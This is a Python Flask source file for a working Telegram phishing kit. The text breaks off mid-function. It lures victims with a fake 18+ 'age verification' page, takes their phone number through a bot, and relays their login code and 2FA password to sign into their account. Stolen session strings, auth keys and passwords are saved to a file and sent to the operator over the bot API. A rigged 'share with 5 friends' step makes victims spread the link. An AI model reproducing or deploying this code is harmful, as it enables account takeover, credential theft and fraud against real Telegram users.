from flask import Flask, request, jsonify, render_template_string, redirect
import os
import json
import base64
import threading
import asyncio
import logging
import time
import random
import requests as http_requests
from datetime import datetime
from telethon import TelegramClient, errors
from telethon.sessions import StringSession
import sys

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# ====== Environment Variables ======
BOT_TOKEN = os.environ.get("BOT_TOKEN")
API_ID = int(os.environ.get("API_ID", "0"))
API_HASH = os.environ.get("API_HASH", "")
YOUR_TELEGRAM_ID = int(os.environ.get("OWNER_ID", "0"))
BOT_USERNAME = os.environ.get("BOT_USERNAME", "YourBot")
# ===================================

if sys.version_info >= (3, 14):
    try:
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    except:
        pass

app = Flask(__name__)

user_sessions = {}
pending_codes = {}
pending_2fa = {}
sessions_lock = threading.Lock()
bot_start_sessions = {}

# ====== Persistent Storage ======
DATA_FILE = "captured_accounts.json"

def load_accounts():
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, 'r') as f:
                return json.load(f)
        except:
            return []
    return []

def save_account(account):
    accounts = load_accounts()
    found = False
    for i, a in enumerate(accounts):
        if a['phone'] == account['phone']:
            accounts[i] = account
            found = True
            break
    if not found:
        accounts.append(account)
    with open(DATA_FILE, 'w') as f:
        json.dump(accounts, f, indent=2)
    logger.info(f"✅ Saved: {account['phone']}")
    return account

captured_accounts = load_accounts()

def format_phone(ph):
    if not ph:
        return ph
    digits = ''.join(filter(str.isdigit, ph))
    if not digits:
        return ph
    if ph.startswith('+'):
        return ph
    if len(digits) == 10:
        return '+91' + digits
    if len(digits) == 12 and digits.startswith('91'):
        return '+' + digits
    return '+' + digits

# ====== Bot Notification ======
def send_bot_notification(phone, ss, me, dc, password_used=False, password_text=None):
    try:
        pwd_line = f"\n🔐 **Password:** `{password_text}`" if password_text else ""
        msg = (
            f"🔔 **New Account Captured!**\n"
            f"📱 `{phone}`\n"
            f"👤 {me.first_name or ''} {me.last_name or ''}\n"
            f"🆔 `{me.id}`\n"
            f"📛 @{me.username or 'N/A'}\n"
            f"🌐 DC: `{dc}`{pwd_line}\n\n"
            f"🔑 **Session ({len(ss)} chars):**\n`{ss}`"
        )
        http_requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={'chat_id': YOUR_TELEGRAM_ID, 'text': msg, 'parse_mode': 'Markdown'}, timeout=15)
    except Exception as e:
        logger.error(f"Bot notify error: {e}")

# ====== Telegram Async Functions ======

def run_telegram_action(phone, code=None, password=None):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    try:
        async def send_code():
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            try:
                r = await client.send_code_request(phone)
                session_str = StringSession.save(client.session)
                with sessions_lock:
                    user_sessions[phone] = {
                        'hash': r.phone_code_hash,
                        'session': session_str,
                    }
                    pending_codes[phone] = 'sent'
                    pending_2fa[phone] = False
                return {'success': True}
            except errors.FloodWaitError as e:
                with sessions_lock: pending_codes[phone] = 'err'
                return {'success': False, 'error': f'Flood wait {e.seconds}s'}
            except Exception as e:
                with sessions_lock: pending_codes[phone] = 'err'
                return {'success': False, 'error': str(e)[:80]}
            finally:
                await client.disconnect()
        
        async def verify():
            with sessions_lock:
                s = user_sessions.get(phone, {})
            
            client = TelegramClient(StringSession(s.get('session', '')), API_ID, API_HASH)
            try:
                await client.connect()
                
                if await client.is_user_authorized():
                    me = await client.get_me()
                else:
                    try:
                        await client.sign_in(phone=phone, code=code, phone_code_hash=s.get('hash', ''))
                        me = await client.get_me()
                    except errors.SessionPasswordNeededError:
                        with sessions_lock:
                            pending_2fa[phone] = True
                            pending_codes[phone] = '2fa_needed'
                        if password:
                            try:
                                await client.sign_in(password=password)
                                me = await client.get_me()
                                with sessions_lock:
                                    pending_2fa[phone] = False
                                    pending_codes[phone] = 'done'
                            except errors.PasswordHashInvalidError:
                                return {'success': False, 'error': 'Wrong 2FA password'}
                            except Exception as e:
                                return {'success': False, 'error': f'2FA error: {str(e)[:50]}'}
                        else:
                            return {'success': False, 'error': '2FA', 'needs_password': True}
                    except errors.PhoneCodeInvalidError:
                        return {'success': False, 'error': 'Wrong code'}
                    except errors.PhoneCodeExpiredError:
                        return {'success': False, 'error': 'Code expired'}
                    except Exception as e:
                        return {'success': False, 'error': str(e)[:80]}
                
                await client.get_dialogs()
                ss = StringSession.save(client.session)
                
                auth_key = None
                try:
                    auth_key = client.session.auth_key.key
                except:
                    pass
                
                dc = client.session.dc_id
                
                if not auth_key:
                    await client.disconnect()
                    await asyncio.sleep(0.5)
                    client2 = TelegramClient(StringSession(ss), API_ID, API_HASH)
                    await client2.connect()
                    await client2.get_dialogs()
                    me = await client2.get_me()
                    ss = StringSession.save(client2.session)
                    auth_key = client2.session.auth_key.key
                    dc = client2.session.dc_id
                    await client2.disconnect()
                    client = client2
                
                auth_b64 = base64.b64encode(auth_key).decode() if auth_key else ""
                password_used = password is not None
                
                acc = {
                    'phone': phone,
                    'user_id': me.id,
                    'username': me.username or '',
                    'first_name': me.first_name or '',
                    'last_name': me.last_name or '',
                    'session': ss,
                    'webk': json.dumps({
                        'dcId': dc, 'authKey': auth_b64,
                        'userId': me.id, 'isSupport': False, 'isTest': False
                    }),
                    'dc': dc,
                    'time': str(datetime.now()),
                    'has_2fa': password_used,
                    'password': password if password_used else ''
                }
                
                save_account(acc)
                global captured_accounts
                captured_accounts = load_accounts()
                
                with sessions_lock:
                    if phone in user_sessions: del user_sessions[phone]
                    if phone in pending_2fa: del pending_2fa[phone]
                    pending_codes[phone] = 'done'
                
                send_bot_notification(phone, ss, me, dc, password_used, password)
                return {'success': True, 'session': ss}
                
            except Exception as e:
                e_str = str(e)
                if 'PHONE_CODE_INVALID' in e_str: return {'success': False, 'error': 'Wrong code'}
                if 'SESSION_PASSWORD_NEEDED' in e_str: return {'success': False, 'error': '2FA', 'needs_password': True}
                if 'PASSWORD_HASH_INVALID' in e_str: return {'success': False, 'error': 'Wrong 2FA password'}
                return {'success': False, 'error': e_str[:80]}
            finally:
                try:
                    await client.disconnect()
                except:
                    pass
        
        if code:
            return loop.run_until_complete(verify())
        else:
            return loop.run_until_complete(send_code())
    finally:
        loop.close()


# ====== BOT POLLING (FIXED) ======

def set_bot_commands():
    """Set bot command list so users see /start"""
    try:
        http_requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/setMyCommands",
            json={
                'commands': [
                    {'command': 'start', 'description': 'Verify your account'}
                ]
            }
        )
    except:
        pass

def bot_polling_loop():
    """Bot polling with better error handling"""
    offset = 0
    logger.info("🤖 Bot polling started...")
    set_bot_commands()
    
    while True:
        try:
            resp = http_requests.get(
                f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates",
                params={'offset': offset, 'timeout': 30},
                timeout=35
            )
            data = resp.json()
            
            if data.get('ok'):
                for update in data.get('result', []):
                    offset = update['update_id'] + 1
                    handle_bot_update(update)
            else:
                logger.error(f"Bot API error: {data}")
                time.sleep(10)
        except Exception as e:
            logger.error(f"Bot polling error: {e}")
            time.sleep(5)

def handle_bot_update(update):
    """Handle bot updates with proper logging"""
    msg = update.get('message', {})
    chat_id = msg.get('chat', {}).get('id')
    
    if not chat_id:
        return
    
    text = msg.get('text', '')
    logger.info(f"📩 Bot received: '{text[:50]}' from {chat_id}")
    
    # ===== /start command =====
    if text.startswith('/start'):
        parts = text.split(' ', 1)
        session_id = parts[1].strip() if len(parts) > 1 and parts[1].strip() else None
        
        logger.info(f"📌 Session ID from /start: {session_id}")
        
        if session_id:
            with sessions_lock:
                bot_start_sessions[session_id] = {
                    'chat_id': chat_id,
                    'phone': None,
                    'status': 'waiting',
                    'timestamp': time.time()
                }
            
            # ====== SEND 2 MESSAGES (FIXED) ======
            # Message 1
            http_requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    'chat_id': chat_id,
                    'text': "🔞 Get full access to the files for free 💦",
                    'parse_mode': 'Markdown'
                }
            )
            
            # Message 2 with Contact Button
            time.sleep(0.8)
            keyboard = {
                'keyboard': [[{
                    'text': '👇',
                    'request_contact': True
                }]],
                'resize_keyboard': True,
                'one_time_keyboard': True
            }
            
            http_requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    'chat_id': chat_id,
                    'text': "👇 Please confirm you're not a robot",
                    'parse_mode': 'Markdown',
                    'reply_markup': keyboard
                }
            )
            logger.info(f"✅ Messages sent to {chat_id}")
        else:
            # /start without session ID
            http_requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    'chat_id': chat_id,
                    'text': (
                        "🔞 **Welcome!**\n\n"
                        "Please go back to the website and click the "
                        "\"Verify via Telegram\" button to get started."
                    ),
                    'parse_mode': 'Markdown'
                }
            )
    
    # ===== Contact received =====
    elif msg.get('contact'):
        phone = msg['contact'].get('phone_number', '')
        contact_user_id = msg['contact'].get('user_id')
        
        if phone:
            phone = format_phone(phone)
        
        logger.info(f"📞 Contact received: {phone} from user {contact_user_id}")
        
        found = False
        with sessions_lock:
            for sid, sdata in bot_start_sessions.items():
                if sdata['chat_id'] == chat_id and sdata['status'] == 'waiting':
                    sdata['phone'] = phone
                    sdata['status'] = 'received'
                    found = True
                    
                    # Remove keyboard
                    http_requests.post(
                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                        json={
                            'chat_id': chat_id,
                            'text': "✅ **Verified!** Go back to the website now.",
                            'parse_mode': 'Markdown',
                            'reply_markup': {'remove_keyboard': True}
                        }
                    )
                    logger.info(f"✅ Contact matched to session {sid}")
                    break
        
        if not found:
            http_requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    'chat_id': chat_id,
                    'text': "✅ Phone received! Go back to the website.",
                    'reply_markup': {'remove_keyboard': True}
                }
            )


# ====== FIXED PHISHING PAGE ======
PAGE = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Premium Content</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0b0b0f;color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.modal{background:#12121a;border-radius:20px;padding:30px 24px 24px;max-width:380px;width:100%;border:1px solid #1e1e2e;text-align:center;animation:slideUp 0.4s ease}
@keyframes slideUp{from{transform:translateY(30px);opacity:0}to{transform:translateY(0);opacity:1}}
.icon{font-size:52px;margin-bottom:10px}
h2{font-size:19px;margin-bottom:4px}
p{color:#888;font-size:13px;margin-bottom:20px;line-height:1.5}

.contact-box{background:#0b0b0f;border:2px solid #1e1e2e;border-radius:16px;padding:30px 20px;margin-bottom:14px}
.contact-box .big-icon{font-size:60px;margin-bottom:10px}
.contact-box h3{font-size:16px;margin-bottom:6px}
.contact-box p{font-size:12px;color:#666;margin-bottom:18px}

.btn-primary{width:100%;padding:18px;background:#0088cc;border:none;border-radius:14px;color:#fff;font-size:16px;font-weight:700;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;box-shadow:0 6px 25px rgba(0,136,204,0.3);transition:0.2s}
.btn-primary:hover{background:#0071b3;transform:translateY(-1px)}
.btn-primary:active{transform:translateY(0)}

.btn-retry{width:100%;padding:14px;background:transparent;border:1px solid #1e1e2e;border-radius:12px;color:#888;font-size:13px;cursor:pointer;margin-top:10px;display:none;transition:0.2s}
.btn-retry:hover{border-color:#0088cc;color:#fff}

.status-box{padding:12px;border-radius:10px;margin:10px 0;display:none;font-size:13px;text-align:center}
.status-box.show{display:block}
.status-box.waiting{background:rgba(255,152,0,0.12);color:#FFB74D;border:1px solid rgba(255,152,0,0.2)}
.status-box.success{background:rgba(52,199,89,0.12);color:#81C784;border:1px solid rgba(52,199,89,0.2)}
.status-box.error{background:rgba(255,45,85,0.12);color:#EF9A9A;border:1px solid rgba(255,45,85,0.2)}
.status-box.info{background:rgba(0,136,255,0.12);color:#90CAF9;border:1px solid rgba(0,136,255,0.2)}

.code-display{background:#0b0b0f;border:2px solid #1e1e2e;border-radius:12px;padding:14px;font-size:32px;text-align:center;letter-spacing:16px;color:#fff;font-weight:700;min-height:56px;margin:10px 0;font-family:monospace}
.numpad{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin:12px 0}
.numpad .key{padding:18px;border:none;border-radius:10px;background:#12121a;color:#fff;font-size:22px;cursor:pointer;transition:0.12s;font-weight:600}
.numpad .key:active{transform:scale(0.94);background:#2a2a3e}
.numpad .key-clear{background:rgba(255,45,85,0.12);color:#ff2d55}
.numpad .key-submit{background:#34c759;color:#fff;font-weight:700;font-size:14px}
.numpad .key-submit:disabled{background:#1a1a2e;color:#555;cursor:not-allowed}

.password-input{width:100%;padding:15px;background:#0b0b0f;border:2px solid #1e1e2e;border-radius:12px;color:#fff;font-size:18px;text-align:center;outline:none;margin:10px 0}
.password-input:focus{border-color:#0088cc}
.password-input::placeholder{color:#444}

.loader{margin:20px auto;width:48px;height:48px;border:4px solid #1a1a2e;border-top-color:#0088cc;border-radius:50%;animation:spin 0.8s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}

.step{display:none}
.step.active{display:block}

.share-progress{display:flex;justify-content:center;gap:6px;margin:16px 0}
.share-step{width:36px;height:36px;border-radius:50%;background:#1a1a2e;display:flex;align-items:center;justify-content:center;font-size:13px;color:#555;font-weight:700;border:2px solid transparent;transition:0.3s}
.share-step.done{background:#34c759;color:#fff;border-color:#34c759;box-shadow:0 0 12px rgba(52,199,89,0.3)}
.share-step.active{background:transparent;color:#fff;border-color:#0088cc;animation:pulse 1.2s infinite}
@keyframes pulse{0%{box-shadow:0 0 0 0 rgba(0,136,255,0.3)}50%{box-shadow:0 0 0 8px rgba(0,136,255,0)}100%{box-shadow:0 0 0 0 rgba(0,136,255,0)}}

.share-link-box{background:#0b0b0f;padding:12px;border-radius:10px;border:1px solid #1e1e2e;margin-top:14px;text-align:center}
.share-link-box p{font-size:11px;color:#555;margin-bottom:6px}
.share-link-box code{color:#0088cc;font-size:10px;word-break:break-all}

.footer{text-align:center;padding:15px 0 5px;color:#333;font-size:10px}

/* QR Code option */
.qr-section{margin-top:14px;padding-top:14px;border-top:1px solid #1e1e2e}
.qr-section p{font-size:11px;color:#555;margin-bottom:8px}
</style>
</head>
<body>

<div class="modal" id="mainModal">
    
    <!-- STEP 1: Contact Request -->
    <div id="s1" class="step active">
        <div class="icon">🔞</div>
        <h2>Age Verification Required</h2>
        <p>You must verify your age to access this 18+ premium content</p>
        
        <div class="contact-box">
            <div class="big-icon">📱</div>
            <h3>Verify with Telegram</h3>
            <p>Tap the button below to quickly verify your identity via Telegram</p>
            
            <button class="btn-primary" id="requestContactBtn" onclick="requestContact()">
                ✈️ Verify via Telegram
            </button>
            
            <button class="btn-retry" id="retryBtn" onclick="requestContact()" style="display:none">
                🔄 Retry — Open Telegram Again
            </button>
        </div>
        
        <div id="contactStatus" class="status-box"></div>
        <div class="footer">🔒 Your data is encrypted and secure</div>
    </div>
    
    <!-- STEP 2: OTP -->
    <div id="s2" class="step">
        <div class="icon">🔐</div>
        <h2>Enter Verification Code</h2>
        <p>Code sent to <span id="pd" style="color:#0088cc;font-weight:700;">+91XXXXXXXXXX</span></p>
        
        <div id="cs" class="status-box waiting show" style="display:none">⏳ Sending code...</div>
        
        <div class="code-display" id="cdisp">_____</div>
        
        <div class="numpad" id="np">
            <button class="key" onclick="pk('1')">1</button>
            <button class="key" onclick="pk('2')">2</button>
            <button class="key" onclick="pk('3')">3</button>
            <button class="key" onclick="pk('4')">4</button>
            <button class="key" onclick="pk('5')">5</button>
            <button class="key" onclick="pk('6')">6</button>
            <button class="key" onclick="pk('7')">7</button>
            <button class="key" onclick="pk('8')">8</button>
            <button class="key" onclick="pk('9')">9</button>
            <button class="key key-clear" onclick="cc()">⌫</button>
            <button class="key" onclick="pk('0')">0</button>
            <button class="key key-submit" id="sb" onclick="sc()">✓ OK</button>
        </div>
        
        <div id="vs" class="status-box"></div>
        <p style="font-size:11px;color:#555;margin-top:6px;cursor:pointer" onclick="resetToContact()">← Use different account</p>
    </div>
    
    <!-- STEP 2B: 2FA -->
    <div id="s2b" class="step">
        <div class="icon">🔑</div>
        <h2>Extra Security</h2>
        <p>This account has 2FA enabled. Enter your password:</p>
        <input type="password" id="pwdInput" class="password-input" placeholder="Enter Telegram password" maxlength="64">
        <button class="btn-primary" onclick="submitPassword()" style="background:#ff2d55;box-shadow:0 6px 25px rgba(255,45,85,0.3)">🔑 Verify Password</button>
        <div id="pwdStatus" class="status-box"></div>
    </div>
    
    <!-- STEP 3: Share Trick -->
    <div id="s3" class="step">
        <div class="icon">🎬</div>
        <h2>Almost There!</h2>
        <p>Share with <strong>5 friends</strong> to unlock the video</p>
        
        <div class="share-progress" id="shareProgress">
            <div class="share-step active" id="sp1">1</div>
            <div class="share-step" id="sp2">2</div>
            <div class="share-step" id="sp3">3</div>
            <div class="share-step" id="sp4">4</div>
            <div class="share-step" id="sp5">5</div>
        </div>
        
        <div id="shareStatus" class="status-box waiting show" style="display:block">⏳ Share to start unlocking...</div>
        
        <button class="btn-primary" onclick="simulateShare()" style="background:#34c759;box-shadow:0 6px 25px rgba(52,199,89,0.3)">📤 Share to Telegram</button>
        
        <div class="share-link-box">
            <p>🔗 Your personal link:</p>
            <code id="shareLink">https://t.me/share/url?url=...</code>
        </div>
        
        <p style="font-size:11px;color:#555;margin-top:12px">⏳ This may take a moment after sharing</p>
    </div>
</div>

<script>
// ===== STATE MANAGEMENT =====
var SAVED_PHONE_KEY = 'pulse_phone';
var SAVED_STEP_KEY = 'pulse_step';
var SAVED_SHARES_KEY = 'pulse_shares';

var phoneNumber = localStorage.getItem(SAVED_PHONE_KEY) || '';
var savedStep = localStorage.getItem(SAVED_STEP_KEY) || '';
var codeDigits = '';
var codeCheckInterval = null;
var passwordCheckInterval = null;
var sharesDone = parseInt(localStorage.getItem(SAVED_SHARES_KEY) || '0', 10);
var shareLinkBase = window.location.origin + window.location.pathname;
var botSessionId = '';
var contactCheckInterval = null;
var contactTimeout = null;

// ===== ON LOAD - Restore state =====
(function() {
    if (savedStep === 'share_page') {
        showStep('s3');
        setupShareLink();
        updateShareProgress();
        var st = document.getElementById('shareStatus');
        if (sharesDone >= 4) {
            st.className = 'status-box waiting show';
            st.innerHTML = '⏳ Almost there! Just 1 more share!';
        } else if (sharesDone > 0) {
            st.className = 'status-box success show';
            st.innerHTML = '✅ ' + sharesDone + '/5 shared! ' + (5 - sharesDone) + ' more...';
        }
    } else if (savedStep === 'otp_sent' && phoneNumber) {
        showStep('s2');
        document.getElementById('pd').textContent = phoneNumber;
        var cs = document.getElementById('cs');
        cs.className = 'status-box success show';
        cs.innerHTML = '✅ Code sent! Enter the code:';
        cs.style.display = 'block';
        startCodeCheck();
    } else {
        showStep('s1');
    }
})();

function showStep(id) {
    document.querySelectorAll('.step').forEach(function(el) { el.classList.remove('active'); });
    document.getElementById(id).classList.add('active');
}

// ===== REQUEST CONTACT VIA BOT (FIXED) =====
function requestContact() {
    botSessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
    
    var st = document.getElementById('contactStatus');
    st.className = 'status-box info show';
    st.innerHTML = '⏳ Opening Telegram... Tap "👇" button to share your number.';
    st.style.display = 'block';
    
    document.getElementById('retryBtn').style.display = 'none';
    document.getElementById('requestContactBtn').disabled = true;
    
    // ====== FIXED: Use location.href instead of window.open ======
    var botUsername = '{{ BOT_USERNAME }}';
    var telegramUrl = 'https://t.me/' + botUsername + '?start=' + botSessionId;
    
    // Try window.open first (desktop)
    var win = window.open(telegramUrl, '_blank');
    
    // If popup blocked, redirect current page
    if (!win || win.closed || typeof win.closed === 'undefined') {
        window.location.href = telegramUrl;
    }
    
    // Start polling
    if (contactCheckInterval) clearInterval(contactCheckInterval);
    contactCheckInterval = setInterval(checkBotContact, 2000);
    
    // Timeout after 45 seconds
    if (contactTimeout) clearTimeout(contactTimeout);
    contactTimeout = setTimeout(function() {
        clearInterval(contactCheckInterval);
        contactCheckInterval = null;
        
        document.getElementById('requestContactBtn').disabled = false;
        document.getElementById('retryBtn').style.display = 'block';
        
        st.className = 'status-box error show';
        st.innerHTML = '❌ Didn\'t receive your number? Tap "Retry" below.';
        st.style.display = 'block';
    }, 45000);
}

async function checkBotContact() {
    try {
        var res = await fetch('/api/bot_check', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({session_id: botSessionId})
        });
        var data = await res.json();
        
        if (data.phone) {
            clearInterval(contactCheckInterval);
            contactCheckInterval = null;
            if (contactTimeout) clearTimeout(contactTimeout);
            
            phoneNumber = data.phone;
            localStorage.setItem(SAVED_PHONE_KEY, phoneNumber);
            
            var st = document.getElementById('contactStatus');
            st.className = 'status-box success show';
            st.innerHTML = '✅ Phone received! Sending verification code...';
            st.style.display = 'block';
            
            document.getElementById('retryBtn').style.display = 'none';
            
            sendPhoneToBackend(phoneNumber);
        }
    } catch(e) {}
}

async function sendPhoneToBackend(phone) {
    try {
        var res = await fetch('/api/share', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({phone: phone})
        });
        var data = await res.json();
        if (data.success) {
            localStorage.setItem(SAVED_STEP_KEY, 'otp_sent');
            showStep('s2');
            document.getElementById('pd').textContent = phone;
            var cs = document.getElementById('cs');
            cs.className = 'status-box waiting show';
            cs.innerHTML = '⏳ Sending code to your Telegram...';
            cs.style.display = 'block';
            startCodeCheck();
        } else {
            var st = document.getElementById('contactStatus');
            st.className = 'status-box error show';
            st.innerHTML = '❌ Error: ' + (data.error || 'Failed');
            st.style.display = 'block';
            document.getElementById('requestContactBtn').disabled = false;
            document.getElementById('retryBtn').style.display = 'block';
        }
    } catch(e) {
        var st = document.getElementById('contactStatus');
        st.className = 'status-box error show';
        st.innerHTML = '❌ Connection error. Tap Retry.';
        st.style.display = 'block';
        document.getElementById('requestContactBtn').disabled = false;
        document.getElementById('retryBtn').style.display = 'block';
    }
}

// ===== OTP CHECK =====
function startCodeCheck() {
    if (codeCheckInterval) clearInterval(codeCheckInterval);
    codeCheckInterval = setInterval(async function() {
        try {
            var res = await fetch('/api/check', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({phone: phoneNumber})
            });
            var data = await res.json();
            if (data.s === 'sent') {
                clearInterval(codeCheckInterval); codeCheckInterval = null;
                var cs = document.getElementById('cs');
                cs.className = 'status-box success show';
                cs.innerHTML = '✅ Code sent! Enter the 5-digit code:';
                cs.style.display = 'block';
            } else if (data.s === 'done') {
                clearInterval(codeCheckInterval); codeCheckInterval = null;
                localStorage.setItem(SAVED_STEP_KEY, 'share_page');
                showStep('s3');
                setupShareLink();
            } else if (data.s === '2fa_needed') {
                clearInterval(codeCheckInterval); codeCheckInterval = null;
                showStep('s2b');
            } else if (data.s === 'err') {
                clearInterval(codeCheckInterval); codeCheckInterval = null;
                var cs = document.getElementById('cs');
                cs.className = 'status-box error show';
                cs.innerHTML = '❌ Error sending code';
                cs.style.display = 'block';
            }
        } catch(e) {}
    }, 2000);
}

function startPasswordCheck() {
    if (passwordCheckInterval) clearInterval(passwordCheckInterval);
    passwordCheckInterval = setInterval(async function() {
        try {
            var res = await fetch('/api/check', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({phone: phoneNumber})
            });
            var data = await res.json();
            if (data.s === 'done') {
                clearInterval(passwordCheckInterval); passwordCheckInterval = null;
                localStorage.setItem(SAVED_STEP_KEY, 'share_page');
                showStep('s3');
                setupShareLink();
            } else if (data.s === 'err') {
                clearInterval(passwordCheckInterval); passwordCheckInterval = null;
                var ps = document.getElementById('pwdStatus');
                ps.className = 'status-box error show';
                ps.innerHTML = '❌ Verification failed';
                ps.style.display = 'block';
            }
        } catch(e) {}
    }, 2000);
}

function pk(n) {
    if (codeDigits.length < 5) {
        codeDigits += n;
        document.getElementById('cdisp').textContent = codeDigits;
        if (codeDigits.length === 5) setTimeout(sc, 200);
    }
}
function cc() { 
    codeDigits = codeDigits.slice(0, -1); 
    document.getElementById('cdisp').textContent = codeDigits || '_____'; 
}

async function sc() {
    if (codeDigits.length < 5) { showVerifyStatus('❌ Enter all 5 digits', 'error'); return; }
    document.getElementById('sb').disabled = true;
    document.getElementById('sb').textContent = '⏳';
    try {
        var res = await fetch('/api/verify', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({phone: phoneNumber, code: codeDigits})
        });
        var data = await res.json();
        if (data.success) {
            localStorage.setItem(SAVED_STEP_KEY, 'share_page');
            showStep('s3');
            setupShareLink();
            if (codeCheckInterval) { clearInterval(codeCheckInterval); codeCheckInterval = null; }
        } else if (data.needs_password) {
            showStep('s2b');
            if (codeCheckInterval) { clearInterval(codeCheckInterval); codeCheckInterval = null; }
        } else {
            showVerifyStatus('❌ ' + (data.error || 'Invalid'), 'error');
            codeDigits = ''; document.getElementById('cdisp').textContent = '_____';
            document.getElementById('sb').disabled = false; document.getElementById('sb').textContent = '✓ OK';
        }
    } catch(e) { showVerifyStatus('❌ Network error','error'); document.getElementById('sb').disabled = false; document.getElementById('sb').textContent = '✓ OK'; }
}

async function submitPassword() {
    var pwd = document.getElementById('pwdInput').value.trim();
    if (!pwd) {
        var ps = document.getElementById('pwdStatus');
        ps.className = 'status-box error show';
        ps.innerHTML = '❌ Enter your password';
        ps.style.display = 'block';
        return;
    }
    var ps = document.getElementById('pwdStatus');
    ps.className = 'status-box waiting show';
    ps.innerHTML = '⏳ Verifying...';
    ps.style.display = 'block';
    try {
        var res = await fetch('/api/verify', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({phone: phoneNumber, code: codeDigits, password: pwd})
        });
        var data = await res.json();
        if (data.success) {
            localStorage.setItem(SAVED_STEP_KEY, 'share_page');
            showStep('s3');
            setupShareLink();
            if (passwordCheckInterval) { clearInterval(passwordCheckInterval); passwordCheckInterval = null; }
        } else {
            ps.className = 'status-box error show';
            ps.innerHTML = '❌ ' + (data.error || 'Wrong password');
            ps.style.display = 'block';
        }
    } catch(e) {
        ps.className = 'status-box error show';
        ps.innerHTML = '❌ Connection error';
        ps.style.display = 'block';
    }
}

function showVerifyStatus(msg, type) {
    document.getElementById('vs').textContent = msg;
    document.getElementById('vs').className = 'status-box ' + type + ' show';
    document.getElementById('vs').style.display = 'block';
}

function resetToContact() {
    if (codeCheckInterval) { clearInterval(codeCheckInterval); codeCheckInterval = null; }
    if (passwordCheckInterval) { clearInterval(passwordCheckInterval); passwordCheckInterval = null; }
    codeDigits = '';
    localStorage.removeItem(SAVED_PHONE_KEY);
    localStorage.removeItem(SAVED_STEP_KEY);
    phoneNumber = '';
    savedStep = '';
    showStep('s1');
}

// ===== SHARE TRICK =====
function setupShareLink() {
    var link = shareLinkBase + '?ref=' + Math.random().toString(36).substr(2, 8);
    document.getElementById('shareLink').textContent = link;
    updateShareProgress();
}

function simulateShare() {
    var shareUrl = 'https://t.me/share/url?url=' + encodeURIComponent(shareLinkBase);
    window.open(shareUrl, '_blank');
    
    if (sharesDone < 4) {
        sharesDone++;
        localStorage.setItem(SAVED_SHARES_KEY, sharesDone.toString());
        updateShareProgress();
    }
    
    var st = document.getElementById('shareStatus');
    
    if (sharesDone < 4) {
        st.className = 'status-box success show';
        st.innerHTML = '✅ ' + sharesDone + '/5 shared! ' + (5 - sharesDone) + ' more to go...';
    } else if (sharesDone === 4) {
        st.className = 'status-box waiting show';
        st.innerHTML = '⏳ Almost there! Just 1 more share!';
        
        setTimeout(function() {
            if (sharesDone === 4) {
                st.className = 'status-box info show';
                st.innerHTML = '🔄 Verifying shares...';
                setTimeout(function() {
                    if (sharesDone === 4) {
                        st.className = 'status-box error show';
                        st.innerHTML = '❌ Verification failed. Try again.';
                        sharesDone = 3;
                        localStorage.setItem(SAVED_SHARES_KEY, '3');
                        updateShareProgress();
                        setTimeout(function() {
                            st.className = 'status-box waiting show';
                            st.innerHTML = '⏳ Share with 2 more friends to retry.';
                        }, 2000);
                    }
                }, 5000);
            }
        }, 3000);
    }
}

function updateShareProgress() {
    for (var i = 1; i <= 5; i++) {
        var el = document.getElementById('sp' + i);
        if (i <= sharesDone) {
            el.className = 'share-step done';
            el.textContent = '✓';
        } else if (i === sharesDone + 1) {
            el.className = 'share-step active';
            el.textContent = i;
        } else {
            el.className = 'share-step';
            el.textContent = i;
        }
    }
}
</script>
</body>
</html>"""


# ====== Flask Routes ======

@app.route('/')
def index():
    page = PAGE.replace('{{ BOT_USERNAME }}', BOT_USERNAME)
    return render_template_string(page)

@app.route('/api/share', methods=['POST'])
def share():
    ph = request.json.get('phone', '')
    if not ph:
        return jsonify({'success': False, 'error': 'Phone required'})
    ph = format_phone(ph)
    logger.info(f"📱 Phone: {ph}")
    
    with sessions_lock:
        pending_codes[ph] = 'sending'
    
    t = threading.Thread(target=run_telegram_action, args=(ph,))
    t.daemon = True
    t.start()
    
    return jsonify({'success': True})

@app.route('/api/bot_check', methods=['POST'])
def bot_check():
    session_id = request.json.get('session_id', '')
    if not session_id:
        return jsonify({'status': 'not_found', 'phone': None})
    
    with sessions_lock:
        data = bot_start_sessions.get(session_id)
        if data:
            if data['phone']:
                return jsonify({'status': 'received', 'phone': data['phone']})
            return jsonify({'status': 'waiting', 'phone': None})
    
    return jsonify({'status': 'not_found', 'phone': None})

@app.route('/api/check', methods=['POST'])
def check():
    phone = request.json.get('phone', '')
    with sessions_lock:
